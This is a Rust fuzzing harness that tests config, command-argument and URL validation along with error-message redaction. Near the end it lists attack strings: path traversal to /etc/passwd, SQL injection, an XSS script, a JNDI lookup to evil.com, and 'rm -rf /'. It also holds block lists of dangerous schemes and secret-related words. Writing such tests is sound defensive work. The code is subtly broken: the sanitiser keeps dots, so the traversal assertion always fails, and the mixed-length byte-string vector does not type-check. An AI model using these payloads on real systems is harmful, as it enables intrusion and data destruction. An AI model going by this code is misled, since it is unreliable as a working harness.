#![no_main]
use libfuzzer_sys::fuzz_target;
use std::str;
use serde::{Serialize, Deserialize};

/// Test data structures for input validation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestConfig {
    pub name: String,
    pub value: i64,
    pub enabled: bool,
    pub options: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TestNetworkConfig {
    pub listen_address: String,
    pub port: u16,
    pub max_connections: u32,
    pub timeout_seconds: u64,
}

/// Test input sanitization functions
fn sanitize_string_input(input: &str) -> String {
    input
        .chars()
        .filter(|c| c.is_alphanumeric() || " .-_".contains(*c))
        .take(256)
        .collect()
}

fn validate_port(port: u16) -> bool {
    port >= 1024 && port <= 65535
}

fn validate_address(address: &str) -> bool {
    if address.is_empty() || address.len() > 253 {
        return false;
    }
    
    // Basic format validation
    let parts: Vec<&str> = address.split(':').collect();
    if parts.len() != 2 {
        return false;
    }
    
    // Validate port part
    if let Ok(port) = parts[1].parse::<u16>() {
        validate_port(port)
    } else {
        false
    }
}

fn validate_name(name: &str) -> bool {
    !name.is_empty() 
        && name.len() <= 64 
        && name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-')
        && !name.starts_with('-')
        && !name.ends_with('-')
}

/// Test configuration parsing with malformed input
fn test_config_parsing(data: &[u8]) -> Result<TestConfig, String> {
    // Try to deserialize as JSON
    if let Ok(json_str) = str::from_utf8(data) {
        if let Ok(config) = serde_json::from_str::<TestConfig>(json_str) {
            // Validate the parsed config
            if !validate_name(&config.name) {
                return Err("Invalid name format".to_string());
            }
            
            if config.value < -1000000 || config.value > 1000000 {
                return Err("Value out of range".to_string());
            }
            
            if config.options.len() > 100 {
                return Err("Too many options".to_string());
            }
            
            for option in &config.options {
                if option.len() > 128 {
                    return Err("Option too long".to_string());
                }
            }
            
            return Ok(config);
        }
    }
    
    // Try to deserialize as bincode
    if let Ok(config) = bincode::deserialize::<TestConfig>(data) {
        // Same validation as above
        if !validate_name(&config.name) {
            return Err("Invalid name format".to_string());
        }
        
        if config.value < -1000000 || config.value > 1000000 {
            return Err("Value out of range".to_string());
        }
        
        if config.options.len() > 100 {
            return Err("Too many options".to_string());
        }
        
        for option in &config.options {
            if option.len() > 128 {
                return Err("Option too long".to_string());
            }
        }
        
        return Ok(config);
    }
    
    Err("Failed to parse config".to_string())
}

/// Test network configuration parsing
fn test_network_config_parsing(data: &[u8]) -> Result<TestNetworkConfig, String> {
    if let Ok(json_str) = str::from_utf8(data) {
        if let Ok(config) = serde_json::from_str::<TestNetworkConfig>(json_str) {
            // Validate network config
            if !validate_address(&format!("{}:{}", config.listen_address, config.port)) {
                return Err("Invalid listen address".to_string());
            }
            
            if !validate_port(config.port) {
                return Err("Invalid port".to_string());
            }
            
            if config.max_connections > 10000 {
                return Err("Too many connections".to_string());
            }
            
            if config.timeout_seconds > 3600 {
                return Err("Timeout too long".to_string());
            }
            
            return Ok(config);
        }
    }
    
    Err("Failed to parse network config".to_string())
}

/// Test command line argument parsing
fn test_command_parsing(data: &[u8]) -> Result<Vec<String>, String> {
    if let Ok(input_str) = str::from_utf8(data) {
        // Split into arguments
        let args: Vec<String> = input_str
            .split_whitespace()
            .map(|s| sanitize_string_input(s))
            .collect();
        
        // Validate arguments
        if args.len() > 50 {
            return Err("Too many arguments".to_string());
        }
        
        for arg in &args {
            if arg.len() > 256 {
                return Err("Argument too long".to_string());
            }
            
            // Check for suspicious patterns
            if arg.contains("..") || arg.contains("/etc/") || arg.contains("\\\\") {
                return Err("Suspicious argument pattern".to_string());
            }
        }
        
        Ok(args)
    } else {
        Err("Invalid UTF-8 input".to_string())
    }
}

/// Test URL parsing and validation
fn test_url_parsing(data: &[u8]) -> Result<String, String> {
    if let Ok(url_str) = str::from_utf8(data) {
        let url = url_str.trim();
        
        // Basic URL validation
        if url.is_empty() || url.len() > 2048 {
            return Err("Invalid URL length".to_string());
        }
        
        // Check for suspicious schemes
        let suspicious_schemes = vec!["javascript:", "data:", "vbscript:", "file:"];
        for scheme in suspicious_schemes {
            if url.to_lowercase().starts_with(scheme) {
                return Err("Suspicious URL scheme".to_string());
            }
        }
        
        // Check for path traversal
        if url.contains("..") || url.contains("/.." ) || url.contains("\\..") {
            return Err("Path traversal attempt".to_string());
        }
        
        // Sanitize URL
        let sanitized = url
            .chars()
            .filter(|c| c.is_ascii() && !c.is_control())
            .take(2048)
            .collect();
        
        Ok(sanitized)
    } else {
        Err("Invalid UTF-8 URL".to_string())
    }
}

/// Test error message sanitization
fn test_error_message_sanitization(error: &str) -> String {
    // Remove sensitive information from error messages
    let sensitive_patterns = vec![
        "password", "key", "secret", "token", "auth", "credential",
        "/home/", "/root/", "C:\\", "\\Users\\",
    ];
    
    let mut sanitized = error.to_lowercase();
    for pattern in sensitive_patterns {
        sanitized = sanitized.replace(pattern, "[REDACTED]");
    }
    
    // Limit length
    if sanitized.len() > 256 {
        sanitized.truncate(256);
    }
    
    sanitized
}

fuzz_target!(|data: &[u8]| {
    // Test configuration parsing with various malformed inputs
    match test_config_parsing(data) {
        Ok(config) => {
            // Valid config should pass all validation checks
            assert!(validate_name(&config.name), "Config name validation failed");
            assert!(config.value >= -1000000 && config.value <= 1000000, "Config value out of range");
            assert!(config.options.len() <= 100, "Too many config options");
        }
        Err(error) => {
            // Error messages should not contain sensitive information
            let sanitized_error = test_error_message_sanitization(&error);
            assert!(!sanitized_error.contains("password"), "Error message contains sensitive info");
            assert!(!sanitized_error.contains("/home/"), "Error message contains path info");
            assert!(sanitized_error.len() <= 256, "Error message too long");
        }
    }
    
    // Test network configuration parsing
    if data.len() >= 32 {
        match test_network_config_parsing(data) {
            Ok(config) => {
                assert!(validate_port(config.port), "Network config port validation failed");
                assert!(config.max_connections <= 10000, "Too many connections");
                assert!(config.timeout_seconds <= 3600, "Timeout too long");
            }
            Err(error) => {
                let sanitized_error = test_error_message_sanitization(&error);
                assert!(sanitized_error.len() <= 256, "Network error message too long");
            }
        }
    }
    
    // Test command parsing
    if data.len() >= 16 {
        match test_command_parsing(data) {
            Ok(args) => {
                assert!(args.len() <= 50, "Too many parsed arguments");
                for arg in &args {
                    assert!(arg.len() <= 256, "Argument too long");
                    assert!(!arg.contains(".."), "Argument contains path traversal");
                }
            }
            Err(error) => {
                let sanitized_error = test_error_message_sanitization(&error);
                assert!(sanitized_error.len() <= 256, "Command error message too long");
            }
        }
    }
    
    // Test URL parsing
    if data.len() >= 8 {
        match test_url_parsing(data) {
            Ok(url) => {
                assert!(url.len() <= 2048, "Sanitized URL too long");
                assert!(!url.contains(".."), "URL contains path traversal");
                assert!(!url.to_lowercase().starts_with("javascript:"), "URL has suspicious scheme");
            }
            Err(error) => {
                let sanitized_error = test_error_message_sanitization(&error);
                assert!(sanitized_error.len() <= 256, "URL error message too long");
            }
        }
    }
    
    // Test various edge cases
    if !data.is_empty() {
        // Test with all null bytes
        let null_data = vec![0u8; data.len()];
        let _ = test_config_parsing(&null_data);
        let _ = test_command_parsing(&null_data);
        
        // Test with all 0xFF bytes
        let max_data = vec![0xFFu8; std::cmp::min(data.len(), 1024)];
        let _ = test_config_parsing(&max_data);
        let _ = test_url_parsing(&max_data);
        
        // Test with random UTF-8 sequences
        let utf8_test = String::from_utf8_lossy(data);
        let _ = test_url_parsing(utf8_test.as_bytes());
        
        // Test string sanitization
        let sanitized = sanitize_string_input(&utf8_test);
        assert!(sanitized.len() <= 256, "Sanitized string too long");
        assert!(sanitized.chars().all(|c| c.is_alphanumeric() || " .-_".contains(c)), 
                "Sanitized string contains invalid characters");
    }
    
    // Test boundary conditions
    if data.len() >= 4 {
        // Test with very small data
        let tiny_data = &data[..4];
        let _ = test_config_parsing(tiny_data);
        
        // Test with medium data
        if data.len() >= 64 {
            let medium_data = &data[..64];
            let _ = test_network_config_parsing(medium_data);
        }
        
        // Test with truncated data at various points
        for i in 1..std::cmp::min(data.len(), 32) {
            let truncated = &data[..i];
            let _ = test_config_parsing(truncated);
            let _ = test_command_parsing(truncated);
        }
    }
    
    // Test specific attack patterns
    let attack_patterns = vec![
        b"../../../etc/passwd",
        b"'; DROP TABLE users; --",
        b"<script>alert('xss')</script>",
        b"${jndi:ldap://evil.com/}",
        b"\x00\x01\x02\x03",
        b"../../../../",
        b"rm -rf /",
        b"cat /proc/meminfo",
    ];
    
    for pattern in attack_patterns {
        let _ = test_config_parsing(pattern);
        let _ = test_command_parsing(pattern);
        let _ = test_url_parsing(pattern);
        
        // Ensure sanitization removes dangerous content
        let sanitized = sanitize_string_input(&String::from_utf8_lossy(pattern));
        assert!(!sanitized.contains(".."), "Sanitization failed to remove path traversal");
        assert!(!sanitized.contains("/etc/"), "Sanitization failed to remove system paths");
    }
});